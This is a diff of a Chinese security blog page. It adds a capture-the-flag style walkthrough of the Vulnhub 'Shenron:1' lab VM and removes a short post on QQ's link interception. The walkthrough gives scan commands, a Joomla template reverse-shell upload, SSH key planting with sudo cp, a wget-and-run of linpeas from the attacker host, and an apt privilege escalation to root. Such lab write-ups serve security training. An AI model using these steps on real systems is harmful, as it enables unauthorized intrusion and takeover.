@@ -82,6 +82,104 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/24/Shenron-1/">
+                Shenron 1
+            </a>
+        </h2>
+    
+    <time>
+        Aug 24, 2022
+    </time>
+    <section class="content">
+        <h1><span id="shenron1">Shenron:1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称shenron1">名称：shenron:1</span></h4><h4><span id="发布日期20201215">发布日期：2020.12.15</span></h4><h4><span id="作者shubham-mandloi">作者：Shubham mandloi</span></h4><h4><span id="系列shenron">系列：shenron</span></h4><h4><span id="推特shubhammandloi">推特：@shubhammandloi</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度中等">难度：中等</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名shenron-1ova">文件名：shenron-1.ova</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshenronshenron-1ova">下载地址：</span></h4><h4><span id="md5-3d9f0f620846bc15f4591e7ac56c04b2">MD5: 3D9F0F620846BC15F4591E7AC56C04B2</span></h4><h4><span id="sha1-4e1d33e2338ada4ca1c093cd67725850a033baad">SHA1: 4E1D33E2338ADA4CA1C093CD67725850A033BAAD</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机shenron1和攻击机kali2021在VirtualBox下设置为桥接模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/24/Shenron-1/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放22，80端口，访问主页还是apache2的初始页：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.113 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/4.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-1/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现&#x2F;joomla和&#x2F;test两个值得关注的目录，可以进行访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.113/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="寻找密码登录joomla后台">寻找密码，登录joomla后台</span></h3><blockquote>
+<p>1.访问192.168.56.113&#x2F;test，发现有password文件，查看password源码，能够发现admin用户的密码：</p>
+<p><img src="/2022/08/24/Shenron-1/7.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-1/8.png" alt="image-"></p>
+<p>2.可以用admin用户登录joomla管理后台：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.113/joomla -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，寻找后台</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/9.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-1/10.png" alt="image-"></p>
+</blockquote>
+<h3><span id="上传webshell">上传webshell</span></h3><blockquote>
+<p>1.修改kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，同时开启kali端口监听：</p>
+<p><img src="/2022/08/24/Shenron-1/11.png" alt="image-"></p>
+<p>2.在joomla后台管理页Templates-Templates-Protostar Details and Files-error.php内写入webshell内容后保存：</p>
+<p><img src="/2022/08/24/Shenron-1/12.png" alt="image-"></p>
+<p>3.访问不存在页面，触发webshell，再使用python构建交互式shell：</p>
+<p><img src="/2022/08/24/Shenron-1/13.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-1/14.png" alt="image-"></p>
+</blockquote>
+<h3><span id="ssh免密登录逐步提权">SSH免密登录，逐步提权</span></h3><blockquote>
+<p>1.在&#x2F;var&#x2F;www&#x2F;html&#x2F;joomla目录下，我们从configuration.php文件中可以发现jenny用户及其密码，可用作登录：</p>
+<p><img src="/2022/08/24/Shenron-1/15.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-1/16.png" alt="image-"></p>
+<p>2.登录jenny用户后，我们尝试使用ssh免密登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub，首先在kali上查看自己的ssh密钥并复制下来，没有的话执行ssh-keygen，回车默认</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/17.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">cd .ssh</span><br><span class="line">echo __public key__ &gt;&gt; authorized_keys，在jenny用户进入/.ssh目录，写入kali复制的密钥</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/18.png" alt="image-"></p>
+<p>3.接着我们进行执行权限查看，发现shenron用户可以使用复制命令，则刚好可以把jenny现在有的ssh密钥复制过去，免密登录shenron：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/19.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /home/jenny/.ssh/authorized_keys /tmp/</span><br><span class="line">sudo -u shenron cp /tmp/authorized_keys /home/shenron/.ssh/</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/20.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.在&#x2F;var&#x2F;opt目录下，我们能发现password.txt，应该是shenron用户的密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python3 -m http.server 8001，在kali开放http服务</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.56.102:8001/linpeas.sh，使用linpeas.sh工具扫描</span><br><span class="line">chmod +x linpeas.sh</span><br><span class="line">./linpeas.sh | tee output</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/21.png" alt="image-"></p>
+<p>2.在shenron用户基础上，再查看权限，发现所有用户都可以使用apt，则用apt进行提权（详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/apt-get/%EF%BC%89%EF%BC%9A">https://gtfobins.github.io/gtfobins/apt-get/）：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;Dpkg::Pre-Invoke &#123;&quot;/bin/sh;false&quot;&#125;&#x27; &gt; $TF</span><br><span class="line">sudo apt install -c $TF sl</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/22.png" alt="image-"></p>
+<p>3.在root用户&#x2F;root目录下，可以查看flag，即root.txt：</p>
+<p><img src="/2022/08/24/Shenron-1/23.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Shenron/" rel="tag">Shenron</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/15/Full-Text-CSDN/">
                 Full-Text CSDN
             </a>
@@ -2757,62 +2855,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/SRC/" rel="tag">SRC</a><a class="tag-none-link" href="/tags/Skadi/" rel="tag">Skadi</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/09/Request-Response-QQ/">
-                QQ 移动端访问控制策略小窥
-            </a>
-        </h2>
-    
-    <time>
-        Aug 9, 2022
-    </time>
-    <section class="content">
-        <h1><span id="qq-移动端访问控制策略小窥">QQ 移动端访问控制策略小窥</span></h1><h2><span id="起因">起因</span></h2><blockquote>
-<p>今天在学习 SRC 发掘的时候，看到很多介绍文章其实在 Hackone 上就有应用例，然后看到一篇需要权限访问的文章，遂要求登录。</p>
-<p>还没有个人账号，于是注册一下，到最后一步得到一个邮箱确认链接：</p>
-<p><img src="/2022/08/09/Request-Response-QQ/1.jpg" alt="image"></p>
-<p>由于是公司电脑，没有装额外通讯软件，遂在手机 click，果不其然被 QQ 拦截了<del>（这个做的真的不行）</del>：</p>
-<p><img src="/2022/08/09/Request-Response-QQ/2.jpg" alt="image"></p>
-<p>于是我把链接 copy 到 PC 上，重新访问，结果弹出该链接已经被使用了的页面，并且可以要求 Resend：</p>
-<p><img src="/2022/08/09/Request-Response-QQ/3.jpg" alt="image"></p>
-</blockquote>
-<h2><span id="推测">推测</span></h2><blockquote>
-<p>我顿了一下（柯南 BGM）：这个确认链接（token）已经被访问，只有可能是我刚才手机 click 了 button 导致的，也就是发送了请求（request），但是没有收到正确回应（response）。</p>
-<p>即 TX 是帮你请求过一次链接的<del>（说好听点是帮你，说不好听就是劫持&#x3D; &#x3D;）</del>，他拦截的只是响应包。</p>
-<ul>
-<li>这样会有两个问题：</li>
-</ul>
-<ol>
-<li>服务端是否是不分情况就去请求了这个链接的，如果换做是其他小公司的服务端这个策略应该是有问题的。</li>
-<li>你是按照什么来判断网站不合规的？证书？白名单？响应包内容？<br>如果是证书，很多 http 链接就会被误报；如果是白名单，那么不需要放行请求（request）就可以判断并拦截；如果是响应（response）内容，为什么 Hackone 还是拦了？</li>
-</ol>
-<p><img src="/2022/08/09/Request-Response-QQ/1.gif" alt="image"></p>
-</blockquote>
-<h2><span id="验证">验证</span></h2><blockquote>
-<p>在朋友（无中生友）的提醒下，发现可以用 dnslog 一试就能验证是否是进行了请求而拦截响应：</p>
-<p><img src="/2022/08/09/Request-Response-QQ/4.jpg" alt="image"></p>
-<p><img src="/2022/08/09/Request-Response-QQ/5.jpg" alt="image"></p>
-<p><del>其实我都不用打码，反正一个是 TX 的 ip，一个是电信的移动 ip</del></p>
-</blockquote>
-<h2><span id="结语">结语</span></h2><blockquote>
-<p>也就是小小发现而已，或许还火星了，记录一下<br>PS：微信现在还没有拦截限制好像，从那个上面倒是可以直接访问链接</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a>
             </div>
         
 
